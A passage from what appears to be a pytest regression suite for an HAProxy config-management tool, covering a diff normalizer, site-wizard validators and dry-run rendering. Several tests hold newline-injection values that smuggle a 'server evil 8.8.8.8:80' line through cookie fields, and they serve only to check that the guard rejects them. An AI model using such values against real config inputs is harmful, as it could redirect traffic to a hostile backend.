    normalized = _normalize_haproxy_config_text_for_diff(text)
    cookie_servers = [
        ln for ln in normalized.split('\n')
        if ln.strip().startswith('server ') and ' cookie ' in ln
    ]
    assert len(cookie_servers) == 2, (
        f"Bulgu #15 regression: per-server cookie attribute was "
        f"incorrectly stripped on a backend that DOES have a "
        f"top-level cookie directive. Got: {cookie_servers}"
    )


def test_normalize_is_idempotent():
    """Running the normalizer twice produces the same result as
    running it once. Required so a config that's already normalized
    (e.g. rendered with the new renderer) passes through unchanged.
    """
    from services.haproxy_config import (
        _normalize_haproxy_config_text_for_diff,
    )
    text = (
        "frontend fe-test\n"
        "    bind *:80\n"
        "    http-request track-sc0 src\n"
        "    http-request track-sc0 src\n"
        "    default_backend be-test\n"
        "\n"
        "backend be-test\n"
        "    server srv1 1.1.1.1:8080 weight 100 check cookie srv1\n"
    )
    once = _normalize_haproxy_config_text_for_diff(text)
    twice = _normalize_haproxy_config_text_for_diff(once)
    assert once == twice, (
        f"Bulgu #15 regression: normalizer is not idempotent. "
        f"Diff between once and twice: "
        f"{[l for l in once.split(chr(10)) if l not in twice.split(chr(10))]}"
    )


def test_diff_endpoint_imports_normalizer():
    """Static-source pin: the diff endpoint in routers/cluster.py
    must import and call `_normalize_haproxy_config_text_for_diff`
    on both `previous_version` and `current_version` config_content
    before feeding them to `difflib.unified_diff`.
    """
    from pathlib import Path
    src = (
        Path(__file__).resolve().parents[1]
        / "routers"
        / "cluster.py"
    )
    body = src.read_text()
    assert "_normalize_haproxy_config_text_for_diff" in body, (
        "Bulgu #15 regression: diff endpoint no longer imports the "
        "normalizer helper; renderer evolution will once again "
        "surface as `+`/`-` noise on untouched entities."
    )
    assert "prev_norm" in body and "curr_norm" in body, (
        "Bulgu #15 regression: diff endpoint must apply "
        "normalization to BOTH sides; otherwise the diff is "
        "asymmetric and produces misleading +/- counts."
    )


# ──────────────────────────────────────────────────────────────────────
# Bulgu #15 round-5 hardening — normalizer edge cases the initial fix
# did not cover.
#
# Each test below pins one specific corner case that, if mishandled by
# the normalizer, would either OVER-STRIP (silently break a valid
# config) or UNDER-STRIP (leave renderer noise in the diff).
# ──────────────────────────────────────────────────────────────────────


def test_normalize_preserves_cookie_when_defaults_declares_it():
    """If the `defaults` section declares `cookie SRVNAME insert ...`,
    HAProxy semantics say every subsequent `backend` / `listen`
    INHERITS that directive. The per-server `cookie <name>` is
    therefore licensed and must NOT be stripped, even if the
    backend block itself doesn't repeat the directive.
    """
    from services.haproxy_config import (
        _normalize_haproxy_config_text_for_diff,
    )
    text = (
        "defaults\n"
        "    mode http\n"
        "    cookie SRVNAME insert indirect nocache\n"
        "\n"
        "backend be-inherit\n"
        "    balance roundrobin\n"
        "    server srv1 1.1.1.1:8080 weight 100 check cookie c1\n"
        "    server srv2 2.2.2.2:8080 weight 100 check cookie c2\n"
    )
    normalized = _normalize_haproxy_config_text_for_diff(text)
    cookie_servers = [
        ln for ln in normalized.split('\n')
        if ln.strip().startswith('server ') and ' cookie ' in ln
    ]
    assert len(cookie_servers) == 2, (
        f"Bulgu #15 round-5 regression: defaults-cookie inheritance "
        f"was ignored — per-server cookies were INCORRECTLY stripped "
        f"on backends that inherit the directive from defaults. "
        f"Got: {cookie_servers}"
    )


def test_normalize_handles_listen_block_track_sc_dedup():
    """`listen` blocks have BOTH frontend AND backend semantics in
    HAProxy. They can declare `http-request track-sc<N>` (frontend-
    style) and `server` lines with `cookie <name>` (backend-style).
    The normalizer must apply both transformations correctly.
    """
    from services.haproxy_config import (
        _normalize_haproxy_config_text_for_diff,
    )
    text = (
        "listen ln-test\n"
        "    bind *:8080\n"
        "    mode http\n"
        "    http-request track-sc0 src\n"
        "    http-request deny if { sc_http_req_rate(0) gt 100 }\n"
        "    http-request track-sc0 src\n"
        "    http-request deny if { sc_http_req_rate(0) gt 200 }\n"
        "    server srv1 1.1.1.1:8080 weight 100 check\n"
    )
    normalized = _normalize_haproxy_config_text_for_diff(text)
    track_lines = [
        ln for ln in normalized.split('\n')
        if ln.strip() == 'http-request track-sc0 src'
    ]
    assert len(track_lines) == 1, (
        f"Bulgu #15 round-5 regression: track-sc<N> dedup did not "
        f"apply inside a `listen` block — got {len(track_lines)} "
        f"track-sc0 lines."
    )


def test_normalize_strips_per_server_cookie_in_listen_block():
    """Per-server cookie strip must also apply to `listen` blocks
    (which can host `server` lines) — same conditional rule as
    backend (strip only if neither the listen block nor `defaults`
    declares a `cookie` directive).
    """
    from services.haproxy_config import (
        _normalize_haproxy_config_text_for_diff,
    )
    text = (
        "listen ln-no-cookie\n"
        "    bind *:8081\n"
        "    mode http\n"
        "    server srv1 1.1.1.1:8081 weight 100 check cookie c1\n"
    )
    normalized = _normalize_haproxy_config_text_for_diff(text)
    cookie_servers = [
        ln for ln in normalized.split('\n')
        if ln.strip().startswith('server ') and ' cookie ' in ln
    ]
    assert cookie_servers == [], (
        f"Bulgu #15 round-5 regression: per-server cookie in `listen` "
        f"block was NOT stripped even though the listen block has no "
        f"licensing `cookie` directive. Got: {cookie_servers}"
    )


def test_normalize_preserves_listen_cookie_when_self_declared():
    """If a `listen` block declares its OWN `cookie ...` directive,
    per-server cookies are licensed and must be preserved.
    """
    from services.haproxy_config import (
        _normalize_haproxy_config_text_for_diff,
    )
    text = (
        "listen ln-with-cookie\n"
        "    bind *:8082\n"
        "    mode http\n"
        "    cookie SVCID insert indirect nocache\n"
        "    server srv1 1.1.1.1:8082 weight 100 check cookie c1\n"
    )
    normalized = _normalize_haproxy_config_text_for_diff(text)
    cookie_servers = [
        ln for ln in normalized.split('\n')
        if ln.strip().startswith('server ') and ' cookie ' in ln
    ]
    assert len(cookie_servers) == 1, (
        f"Bulgu #15 round-5 regression: listen-block cookie directive "
        f"was ignored — per-server cookie was INCORRECTLY stripped. "
        f"Got: {cookie_servers}"
    )


def test_normalize_preserves_server_named_cookie():
    """An operator who unwisely named a server `cookie` (it IS a valid
    server-name token) must NOT have its address stripped by the
    normalizer's pair-strip pass. Guard: cookie strip only applies
    at i >= 3 in the token list (after `server`, `<name>`,
    `<address>`).
    """
    from services.haproxy_config import (
        _normalize_haproxy_config_text_for_diff,
    )
    text = (
        "backend be-edge\n"
        "    balance roundrobin\n"
        "    server cookie 1.1.1.1:8080 weight 100 check\n"
    )
    normalized = _normalize_haproxy_config_text_for_diff(text)
    out_lines = [
        ln.strip() for ln in normalized.split('\n')
        if ln.strip().startswith('server ')
    ]
    assert out_lines == [
        'server cookie 1.1.1.1:8080 weight 100 check'
    ], (
        f"Bulgu #15 round-5 regression: pair-strip incorrectly "
        f"consumed the server-name 'cookie' along with its "
        f"address token. Got: {out_lines}"
    )


def test_normalize_handles_empty_and_whitespace_input():
    """Defensive: empty / whitespace-only / None-like inputs must
    pass through without error.
    """
    from services.haproxy_config import (
        _normalize_haproxy_config_text_for_diff,
    )
    assert _normalize_haproxy_config_text_for_diff("") == ""
    assert _normalize_haproxy_config_text_for_diff(None) is None
    # Newlines-only input.
    assert _normalize_haproxy_config_text_for_diff("\n\n\n") == "\n\n\n"


def test_normalize_handles_comments_that_look_like_directives():
    """A comment line that LOOKS like a directive (`# server ...`)
    must NOT trigger the cookie strip pass; conversely a comment
    that looks like `# cookie ...` must NOT register as a backend
    cookie directive.
    """
    from services.haproxy_config import (
        _normalize_haproxy_config_text_for_diff,
    )
    text = (
        "backend be-comments\n"
        "    balance roundrobin\n"
        "    # cookie SRVNAME insert  ← this comment must NOT count\n"
        "    # server srv-disabled 1.1.1.1:1 cookie ghost  ← also a comment\n"
        "    server srv1 1.1.1.1:8080 check cookie ghost\n"
    )
    normalized = _normalize_haproxy_config_text_for_diff(text)
    # The commented `cookie SRVNAME insert` must NOT count as a
    # licensing directive — so the live `server` line's cookie
    # MUST be stripped.
    cookie_servers = [
        ln for ln in normalized.split('\n')
        if ln.strip().startswith('server ') and ' cookie ' in ln
    ]
    assert cookie_servers == [], (
        f"Bulgu #15 round-5 regression: a COMMENTED-OUT `cookie` "
        f"directive incorrectly counted as licensing, leaving a "
        f"broken stickiness setup intact. Got: {cookie_servers}"
    )
    # The commented-out `server` line must pass through verbatim.
    comments = [
        ln for ln in normalized.split('\n') if ln.strip().startswith('# ')
    ]
    assert any('cookie SRVNAME insert' in c for c in comments), (
        "Bulgu #15 round-5 regression: commented-out directives "
        "must pass through unchanged."
    )
    assert any('# server srv-disabled' in c for c in comments), (
        "Bulgu #15 round-5 regression: commented-out `server` "
        "line was mangled."
    )


# ──────────────────────────────────────────────────────────────────────
# Bulgu #16 round-6 hardening — additional wizard correctness fixes
#
# Three independent improvements, each fixing an "easy to enter
# garbage, hard to discover the cause" UX issue:
#
#   1. Wizard payload `domains` list dedupes case-insensitively
#      and rejects duplicates with a readable error (was silently
#      forwarded to LE / ACL routing / audit logs).
#
#   2. `frontend.monitor_uri` Pydantic validator enforces the
#      `/`-prefixed-no-whitespace contract HAProxy actually needs
#      (was Optional[str] with only max_length).
#
#   3. `ssl.https_frontend_name_suffix` Pydantic validator rejects
#      empty / non-character-class suffixes (was Optional[str] with
#      only max_length — empty produced a downstream
#      `frontend collision` error after a wasted submit round-trip).
#
# Plus one architectural guard on the rejected-version undo path:
#   4. `undo_reject_config_version` refuses to undo a
#      `bulk-site-create-*` / `bulk-import-*` / `restore-*`
#      rejection. Those reject paths hard-delete the underlying
#      entities and the snapshot has `new_values={}` so undo
#      cannot recreate them — silent corruption pre-fix.
# ──────────────────────────────────────────────────────────────────────


def test_wizard_rejects_duplicate_domains_case_insensitive():
    """Operator submits `["Site.com", "site.com", "www.site.com"]` —
    the first two normalise to the SAME entry. Pydantic must reject
    with a clear duplicate-list message instead of silently passing
    the duplicate forward (LE / ACL / audit).
    """
    from pydantic import ValidationError
    from models.site_wizard import SiteCreate

    minimal_payload = {
        "cluster_id": 1,
        "domains": ["Site.com", "site.com", "www.site.com"],
        "backend": {"name": "be1"},
        "servers": [{"server_name": "s1", "server_address": "1.1.1.1", "server_port": 80}],
        "frontend": {"name": "fe1"},
        "ssl": {"mode": "none"},
    }
    try:
        SiteCreate(**minimal_payload)
    except ValidationError as e:
        assert any('Duplicate domain' in str(err) for err in e.errors()), (
            f"Bulgu #16 regression: duplicate domains were accepted "
            f"silently. Got errors: {e.errors()}"
        )
        return
    raise AssertionError(
        "Bulgu #16 regression: duplicate domains were not rejected"
    )


def test_wizard_accepts_unique_domains_after_normalisation():
    """Positive control: case-DIFFERENT but logically distinct
    domains pass through. `Foo.com` + `bar.com` are both unique.
    """
    from models.site_wizard import SiteCreate
    minimal_payload = {
        "cluster_id": 1,
        "domains": ["Foo.com", "bar.com"],
        "backend": {"name": "be1"},
        "servers": [{"server_name": "s1", "server_address": "1.1.1.1", "server_port": 80}],
        "frontend": {"name": "fe1"},
        "ssl": {"mode": "none"},
    }
    sc = SiteCreate(**minimal_payload)
    assert sc.domains == ["foo.com", "bar.com"], (
        "Bulgu #16 regression: unique domains should be lowercased "
        f"and order-preserved. Got {sc.domains}"
    )


def test_wizard_monitor_uri_requires_leading_slash():
    """`monitor-uri hel` (no slash) is silently interpreted by HAProxy
    as a non-matching path → operator's health probe always 503s.
    """
    from pydantic import ValidationError
    from models.site_wizard import FrontendStep
    try:
        FrontendStep(name="fe1", monitor_uri="hel")
    except ValidationError as e:
        assert any("absolute path" in str(err) for err in e.errors()), (
            f"Bulgu #16 regression: non-slash-prefixed monitor_uri was "
            f"accepted. Errors: {e.errors()}"
        )
        return
    raise AssertionError(
        "Bulgu #16 regression: monitor_uri='hel' must be rejected"
    )


def test_wizard_monitor_uri_rejects_whitespace():
    """`monitor-uri /hel th` would be parsed as `monitor-uri /hel`
    with `th` as an unknown trailing keyword — silent breakage.
    """
    from pydantic import ValidationError
    from models.site_wizard import FrontendStep
    try:
        FrontendStep(name="fe1", monitor_uri="/hel th")
    except ValidationError as e:
        assert any("whitespace" in str(err) for err in e.errors()), (
            f"Bulgu #16 regression: whitespace in monitor_uri was "
            f"accepted. Errors: {e.errors()}"
        )
        return
    raise AssertionError(
        "Bulgu #16 regression: monitor_uri with whitespace must be rejected"
    )


def test_wizard_monitor_uri_accepts_simple_path():
    """Positive control: `/health` is a normal valid value."""
    from models.site_wizard import FrontendStep
    fs = FrontendStep(name="fe1", monitor_uri="/health")
    assert fs.monitor_uri == "/health"


def test_wizard_https_suffix_rejects_empty_string():
    """Empty suffix would generate an HTTPS frontend name identical
    to the HTTP frontend's name → fe_collision at submit. Reject
    early with a clear message.
    """
    from pydantic import ValidationError
    from models.site_wizard import SSLChoice
    try:
        SSLChoice(mode="none", https_frontend_name_suffix="")
    except ValidationError as e:
        assert any("must not be empty" in str(err) for err in e.errors()), (
            f"Bulgu #16 regression: empty https_frontend_name_suffix "
            f"was accepted. Errors: {e.errors()}"
        )
        return
    raise AssertionError(
        "Bulgu #16 regression: empty https_frontend_name_suffix "
        "must be rejected"
    )


def test_wizard_https_suffix_rejects_invalid_chars():
    """Invalid chars (spaces, special chars) in the suffix would
    produce a composite frontend name that breaks the HAProxy
    parser.
    """
    from pydantic import ValidationError
    from models.site_wizard import SSLChoice
    for bad in (" tls", "-https space", "tls!", "tls/v2"):
        try:
            SSLChoice(mode="none", https_frontend_name_suffix=bad)
        except ValidationError:
            continue
        raise AssertionError(
            f"Bulgu #16 regression: https_frontend_name_suffix={bad!r} "
            "was accepted but should be rejected (invalid character class)"
        )


def test_wizard_https_suffix_accepts_default():
    """Positive control: the default `-https` value passes."""
    from models.site_wizard import SSLChoice
    sc = SSLChoice(mode="none")
    assert sc.https_frontend_name_suffix == "-https"
    sc2 = SSLChoice(mode="none", https_frontend_name_suffix="_secure")
    assert sc2.https_frontend_name_suffix == "_secure"


def test_undo_reject_endpoint_refuses_bulk_destructive_versions():
    """Static-source pin: the undo endpoint in routers/cluster.py
    must reject `bulk-site-create-*` / `bulk-import-*` /
    `bulk-proxied-host-create-*` / `restore-*` versions with a
    clear 409 error. Pre-fix the endpoint silently flipped the
    version to PENDING, but the entities had already been hard-
    deleted in reject — the apply that followed undid nothing.
    """
    from pathlib import Path
    src = (
        Path(__file__).resolve().parents[1]
        / "routers"
        / "cluster.py"
    )
    body = src.read_text()
    assert "DESTRUCTIVE_PREFIXES" in body, (
        "Bulgu #16 regression: undo endpoint no longer carries the "
        "DESTRUCTIVE_PREFIXES guard tuple."
    )
    assert "'bulk-site-create-'" in body, (
        "Bulgu #16 regression: wizard's bulk-site-create- prefix is "
        "missing from the destructive-version guard list."
    )
    assert "'bulk-import-'" in body, (
        "Bulgu #16 regression: bulk-import- prefix is missing from "
        "the destructive-version guard list."
    )
    assert "'restore-'" in body, (
        "Bulgu #16 regression: restore- prefix is missing from "
        "the destructive-version guard list."
    )
    assert "status_code=409" in body, (
        "Bulgu #16 regression: destructive-undo guard must return "
        "HTTP 409 (operator semantics conflict), not 400/500."
    )


def test_apply_management_hides_undo_for_destructive_versions():
    """Static-source pin: the ApplyManagement UI hides / disables
    the Undo button for destructive bulk versions so the constraint
    is self-documenting before the operator clicks.
    """
    from pathlib import Path
    src = (
        Path(__file__).resolve().parents[1].parent
        / "frontend"
        / "src"
        / "components"
        / "ApplyManagement.js"
    )
    if not src.exists():
        pytest.skip(
            "frontend source tree not present in this build context "
            "(backend-only image)."
        )
    body = src.read_text()
    assert "bulk-site-create-" in body, (
        "Bulgu #16 regression: ApplyManagement.js no longer checks "
        "for bulk-site-create- prefix when rendering Undo button."
    )
    assert "destructive" in body, (
        "Bulgu #16 regression: ApplyManagement.js Undo guard logic "
        "is missing — operator can still click and surface 409."
    )
    assert "Undo (n/a)" in body or "disabled" in body, (
        "Bulgu #16 regression: ApplyManagement.js must visibly mark "
        "Undo as unavailable for destructive versions instead of "
        "letting the click 409 silently."
    )


# ──────────────────────────────────────────────────────────────────────
# Bulgu #17 round-7 audit — additional correctness checks
#
# Five fixes around server-list / health-check / frontend-backend
# mode consistency. Each catches a "wizard accepts → apply fails"
# class of bug at the model boundary so the operator sees a clear
# message instead of a generic 500.
# ──────────────────────────────────────────────────────────────────────


def test_wizard_rejects_duplicate_server_names():
    """Two `server srv1 ...` lines in the same backend block crash
    `haproxy -c` with `Proxy 'be-foo' : duplicate server 'srv1'`.
    """
    from pydantic import ValidationError
    from models.site_wizard import SiteCreate
    payload = {
        "cluster_id": 1,
        "domains": ["site.com"],
        "backend": {"name": "be1"},
        "servers": [
            {"server_name": "srv1", "server_address": "1.1.1.1", "server_port": 80},
            {"server_name": "srv1", "server_address": "2.2.2.2", "server_port": 80},
        ],
        "frontend": {"name": "fe1"},
        "ssl": {"mode": "none"},
    }
    try:
        SiteCreate(**payload)
    except ValidationError as e:
        assert any("Duplicate server names" in str(err) for err in e.errors()), (
            f"Bulgu #17 regression: duplicate server names were "
            f"accepted. Errors: {e.errors()}"
        )
        return
    raise AssertionError(
        "Bulgu #17 regression: duplicate server names must be rejected"
    )


def test_wizard_accepts_distinct_server_names_with_same_address():
    """Positive control: same address+port across two DIFFERENT
    server names is allowed (operator may intentionally route the
    same upstream through canary / primary aliases).
    """
    from models.site_wizard import SiteCreate
    payload = {
        "cluster_id": 1,
        "domains": ["site.com"],
        "backend": {"name": "be1"},
        "servers": [
            {"server_name": "srv1-primary", "server_address": "1.1.1.1", "server_port": 80},
            {"server_name": "srv1-canary", "server_address": "1.1.1.1", "server_port": 80},
        ],
        "frontend": {"name": "fe1"},
        "ssl": {"mode": "none"},
    }
    sc = SiteCreate(**payload)
    assert len(sc.servers) == 2


def test_wizard_rejects_frontend_backend_mode_mismatch():
    """`frontend mode=http` + `backend mode=tcp` (or vice-versa) is
    a config-file-fatal mismatch.
    """
    from pydantic import ValidationError
    from models.site_wizard import SiteCreate
    payload = {
        "cluster_id": 1,
        "domains": ["site.com"],
        "backend": {"name": "be1", "mode": "tcp"},
        "servers": [
            {"server_name": "srv1", "server_address": "1.1.1.1", "server_port": 80},
        ],
        "frontend": {"name": "fe1", "mode": "http"},
        "ssl": {"mode": "none"},
    }
    try:
        SiteCreate(**payload)
    except ValidationError as e:
        assert any("must match backend.mode" in str(err) for err in e.errors()), (
            f"Bulgu #17 regression: fe/be mode mismatch was accepted. "
            f"Errors: {e.errors()}"
        )
        return
    raise AssertionError(
        "Bulgu #17 regression: fe/be mode mismatch must be rejected"
    )


def test_wizard_accepts_matched_tcp_mode():
    """Positive control: matched tcp on both sides is fine."""
    from models.site_wizard import SiteCreate
    payload = {
        "cluster_id": 1,
        "domains": ["site.com"],
        "backend": {"name": "be1", "mode": "tcp"},
        "servers": [
            {"server_name": "srv1", "server_address": "1.1.1.1", "server_port": 80},
        ],
        "frontend": {"name": "fe1", "mode": "tcp"},
        "ssl": {"mode": "none"},
    }
    sc = SiteCreate(**payload)
    assert sc.frontend.mode == "tcp" and sc.backend.mode == "tcp"


def test_wizard_health_check_uri_requires_leading_slash():
    """Mirror of monitor_uri's `/` contract — applied to
    `backend.health_check_uri` which feeds `option httpchk GET <uri>`.
    """
    from pydantic import ValidationError
    from models.site_wizard import BackendStep
    try:
        BackendStep(name="be1", health_check_uri="hh1")
    except ValidationError as e:
        assert any("must start with '/'" in str(err) for err in e.errors()), (
            f"Bulgu #17 regression: non-slash health_check_uri "
            f"accepted. Errors: {e.errors()}"
        )
        return
    raise AssertionError(
        "Bulgu #17 regression: health_check_uri='hh1' must be rejected"
    )


def test_wizard_health_check_uri_rejects_empty_string():
    """Empty string disables nothing — emits `option httpchk GET `
    which HAProxy rejects."""
    from pydantic import ValidationError
    from models.site_wizard import BackendStep
    try:
        BackendStep(name="be1", health_check_uri="")
    except ValidationError as e:
        assert any("must not be empty" in str(err) for err in e.errors()), (
            f"Bulgu #17 regression: empty health_check_uri accepted. "
            f"Errors: {e.errors()}"
        )
        return
    raise AssertionError(
        "Bulgu #17 regression: empty health_check_uri must be rejected"
    )


def test_wizard_health_check_uri_rejects_whitespace():
    """Whitespace in URI splits the directive at the first space.
    """
    from pydantic import ValidationError
    from models.site_wizard import BackendStep
    try:
        BackendStep(name="be1", health_check_uri="/api status")
    except ValidationError as e:
        assert any("whitespace" in str(err) for err in e.errors()), (
            f"Bulgu #17 regression: whitespace in health_check_uri "
            f"accepted. Errors: {e.errors()}"
        )
        return
    raise AssertionError(
        "Bulgu #17 regression: whitespace in health_check_uri must "
        "be rejected"
    )


def test_wizard_server_address_rejects_whitespace_only():
    """`server_address` with min_length=1 alone accepts ' '. The
    renderer then emits `server srv1  :8080` which HAProxy rejects.
    """
    from pydantic import ValidationError
    from models.site_wizard import ServerStep
    try:
        ServerStep(server_name="srv1", server_address="   ", server_port=80)
    except ValidationError as e:
        assert any("must not be empty" in str(err) for err in e.errors()), (
            f"Bulgu #17 regression: whitespace-only server_address "
            f"accepted. Errors: {e.errors()}"
        )
        return
    raise AssertionError(
        "Bulgu #17 regression: whitespace-only server_address must "
        "be rejected"
    )


def test_wizard_server_address_rejects_embedded_space():
    """`server_address='srv1 1.1.1.1'` would parse as name='srv1',
    address='1.1.1.1' on the HAProxy line — silent value shift.
    """
    from pydantic import ValidationError
    from models.site_wizard import ServerStep
    try:
        ServerStep(server_name="srv1", server_address="srv1 1.1.1.1", server_port=80)
    except ValidationError as e:
        assert any("whitespace" in str(err) for err in e.errors()), (
            f"Bulgu #17 regression: embedded-space server_address "
            f"accepted. Errors: {e.errors()}"
        )
        return
    raise AssertionError(
        "Bulgu #17 regression: embedded-space server_address must "
        "be rejected"
    )


# ──────────────────────────────────────────────────────────────────────
# Bulgu #18 round-8 audit — security-sensitive single-line field
# newline-injection guard.
# ──────────────────────────────────────────────────────────────────────


def test_wizard_cookie_options_rejects_newline_injection():
    """Pre-fix `cookie_options="insert indirect\\n    server evil 8.8.8.8:80"`
    smuggled a `server` line into the rendered backend block.
    """
    from pydantic import ValidationError
    from models.site_wizard import BackendStep
    try:
        BackendStep(
            name="be1",
            cookie_name="SRVID",
            cookie_options="insert indirect\n    server evil 8.8.8.8:80",
        )
    except ValidationError as e:
        assert any("line breaks" in str(err) for err in e.errors()), (
            f"Bulgu #18 regression: newline in cookie_options "
            f"accepted. Errors: {e.errors()}"
        )
        return
    raise AssertionError(
        "Bulgu #18 regression: newline-injected cookie_options must "
        "be rejected"
    )


def test_wizard_cookie_name_rejects_newline_injection():
    """Same guard on the cookie name (the FIRST token after `cookie`)."""
    from pydantic import ValidationError
    from models.site_wizard import BackendStep
    try:
        BackendStep(
            name="be1",
            cookie_name="SRV\n    server evil 8.8.8.8:80",
        )
    except ValidationError as e:
        assert any("line breaks" in str(err) for err in e.errors()), (
            f"Bulgu #18 regression: newline in cookie_name accepted. "
            f"Errors: {e.errors()}"
        )
        return
    raise AssertionError(
        "Bulgu #18 regression: newline-injected cookie_name must be rejected"
    )


def test_wizard_cookie_options_accepts_normal_value():
    """Positive control: legitimate `cookie_options` pass."""
    from models.site_wizard import BackendStep
    bs = BackendStep(
        name="be1",
        cookie_name="SRVID",
        cookie_options="insert indirect nocache httponly secure",
    )
    assert bs.cookie_options == "insert indirect nocache httponly secure"


def test_wizard_cookie_options_rejects_carriage_return():
    """Defensive: `\\r` injection (Windows line endings) is also blocked."""
    from pydantic import ValidationError
    from models.site_wizard import BackendStep
    try:
        BackendStep(
            name="be1",
            cookie_name="SRVID",
            cookie_options="insert indirect\r\n    server evil 8.8.8.8:80",
        )
    except ValidationError as e:
        assert any("line breaks" in str(err) for err in e.errors()), (
            f"Bulgu #18 regression: \\r in cookie_options accepted. "
            f"Errors: {e.errors()}"
        )
        return
    raise AssertionError(
        "Bulgu #18 regression: \\r-injected cookie_options must be rejected"
    )


# ──────────────────────────────────────────────────────────────────────
# Bulgu #19 round-9 audit — dry-run vs. real-renderer parity for
# request_headers / response_headers / cookie_options fields.
#
# Pre-fix the wizard's dry-run twin in `routers/site_wizard.py`
# diverged from the real renderer in
# `services/haproxy_config.py`:
#
#   * request_headers / response_headers were DOUBLE-prefixed with
#     `http-request set-header` / `http-response set-header`,
#     producing garbage like:
#         http-request set-header http-request set-header X-Real-IP %[src]
#     which surfaced as misleading "directive may not be valid"
#     warnings during the Step 5 dry-run.
#
#   * backend-level request_headers / response_headers were SKIPPED
#     entirely, so the operator never saw validator warnings until
#     apply time.
#
#   * cookie_options on the backend were SKIPPED, so the dry-run
#     cookie line did not match the real renderer.
# ──────────────────────────────────────────────────────────────────────


def test_dry_run_emits_request_headers_verbatim_no_double_prefix():
    """The dry-run must emit each request_headers / response_headers
    line VERBATIM (matching the real renderer at
    `services/haproxy_config.py:1063-1074`), not double-prefixed.
    """
    from routers.site_wizard import _build_candidate_fragment
    from models.site_wizard import SiteCreate
    payload = {
        "cluster_id": 1,
        "domains": ["site.com"],
        "backend": {"name": "be1"},
        "servers": [
            {"server_name": "srv1", "server_address": "1.1.1.1", "server_port": 80},
        ],
        "frontend": {
            "name": "fe1",
            "request_headers": (
                "http-request add-header X-Forwarded-Proto https\n"
                "http-request set-header X-Real-IP %[src]"
            ),
            "response_headers": (
                "http-response add-header X-Frame-Options SAMEORIGIN"
            ),
        },
        "ssl": {"mode": "none"},
    }
    body = SiteCreate(**payload)
    frag = _build_candidate_fragment(body)
    # Verbatim emission: directives appear EXACTLY ONCE per line,
    # NOT prefixed with `http-request set-header` extra times.
    assert frag.count("http-request set-header X-Real-IP %[src]") == 1, (
        "Bulgu #19 regression: X-Real-IP line emitted incorrectly "
        f"(count != 1). Fragment:\n{frag}"
    )
    assert frag.count("http-request add-header X-Forwarded-Proto https") == 1, (
        "Bulgu #19 regression: X-Forwarded-Proto line emitted "
        f"incorrectly (count != 1). Fragment:\n{frag}"
    )
    assert "http-request set-header http-request" not in frag, (
        "Bulgu #19 regression: dry-run still double-prefixes "
        "request_headers entries — the validator will surface "
        "spurious warnings on a valid config."
    )
    assert "http-response set-header http-response" not in frag, (
        "Bulgu #19 regression: dry-run still double-prefixes "
        "response_headers entries."
    )
    # Positive: response header is present (verbatim).
    assert "http-response add-header X-Frame-Options SAMEORIGIN" in frag, (
        f"Bulgu #19 regression: response_headers verbatim line missing. "
        f"Fragment:\n{frag}"
    )


def test_dry_run_emits_backend_request_response_headers():
    """The dry-run must also emit backend-level header injections,
    mirroring the real renderer at lines 1306-1324.
    """
    from routers.site_wizard import _build_candidate_fragment
    from models.site_wizard import SiteCreate
    payload = {
        "cluster_id": 1,
        "domains": ["site.com"],
        "backend": {
            "name": "be1",
            "request_headers": (
                "http-request add-header X-Forwarded-Host %[req.hdr(host)]"
            ),
            "response_headers": (
                "http-response del-header Server"
            ),
        },
        "servers": [
            {"server_name": "srv1", "server_address": "1.1.1.1", "server_port": 80},
        ],
        "frontend": {"name": "fe1"},
        "ssl": {"mode": "none"},
    }
    body = SiteCreate(**payload)
    frag = _build_candidate_fragment(body)
    assert "http-request add-header X-Forwarded-Host %[req.hdr(host)]" in frag, (
        f"Bulgu #19 regression: backend-level request_headers not "
        f"emitted by dry-run. Fragment:\n{frag}"
    )
    assert "http-response del-header Server" in frag, (
        f"Bulgu #19 regression: backend-level response_headers not "
        f"emitted by dry-run. Fragment:\n{frag}"
    )


def test_dry_run_emits_cookie_options_when_provided():
    """If the operator customised `cookie_options`, the dry-run must
    emit that string (not just the canonical defaults) so the
    validator can flag a malformed value at Step 5.
    """
    from routers.site_wizard import _build_candidate_fragment
    from models.site_wizard import SiteCreate
    payload = {
        "cluster_id": 1,
        "domains": ["site.com"],
        "backend": {
            "name": "be1",
            "cookie_name": "SRVID",
            "cookie_options": "insert indirect nocache httponly secure",
        },
        "servers": [
            {"server_name": "srv1", "server_address": "1.1.1.1", "server_port": 80},
        ],
        "frontend": {"name": "fe1"},
        "ssl": {"mode": "none"},
    }
    body = SiteCreate(**payload)
    frag = _build_candidate_fragment(body)
    # The operator-supplied opts must appear; the canonical default
    # block (`insert indirect nocache` alone) must NOT also appear
    # as a duplicate line.
    assert "cookie SRVID insert indirect nocache httponly secure" in frag, (
        f"Bulgu #19 regression: cookie_options not emitted in dry-run. "
        f"Fragment:\n{frag}"
    )
    cookie_lines = [
        ln for ln in frag.splitlines()
        if ln.strip().startswith("cookie SRVID")
    ]
    assert len(cookie_lines) == 1, (
        f"Bulgu #19 regression: duplicate cookie lines in dry-run "
        f"(got {len(cookie_lines)}). Should be exactly one. "
        f"Lines: {cookie_lines}"
    )


def test_wizard_rejects_redirect_rules_on_tcp_frontend():
    """HAProxy `redirect` directives are HTTP-only. Pre-fix the wizard
    accepted explicit redirect_rules on a `mode='tcp'` frontend (the
    older check only caught the `https_redirect=true` sugar form);
    the agent's `haproxy -c` then fatally rejected the config at
    apply time.
    """
    from pydantic import ValidationError
    from models.site_wizard import FrontendStep
    try:
        FrontendStep(
            name="fe1",
            mode="tcp",
            redirect_rules=[
                {
                    "type": "scheme",
                    "scheme": "https",
                    "code": 301,
                    "condition": "if !{ ssl_fc }",
                }
            ],
        )
    except ValidationError as e:
        assert any(
            "frontend.redirect_rules" in str(err) for err in e.errors()
        ), (
            f"Bulgu #19 regression: tcp + redirect_rules accepted. "
            f"Errors: {e.errors()}"
        )
        return
    raise AssertionError(
        "Bulgu #19 regression: tcp + redirect_rules must be rejected"
    )


# ──────────────────────────────────────────────────────────────────────
# Bulgu #20 round-10 audit — additional TCP-mode HTTP-only feature
# guards. Each blocker below is a directive the renderer emits
# UNCONDITIONALLY but which HAProxy refuses to load in a TCP-mode
# frontend.
# ──────────────────────────────────────────────────────────────────────


def test_wizard_rejects_compression_on_tcp_frontend():
    """`compression algo gzip` cannot live inside a `mode tcp` frontend
    (HAProxy parse error). The wizard must reject the combination at
    submit time.
    """
    from pydantic import ValidationError
    from models.site_wizard import FrontendStep
    try:
        FrontendStep(name="fe1", mode="tcp", compression=True)
    except ValidationError as e:
        assert any("compression=true" in str(err) for err in e.errors()), (
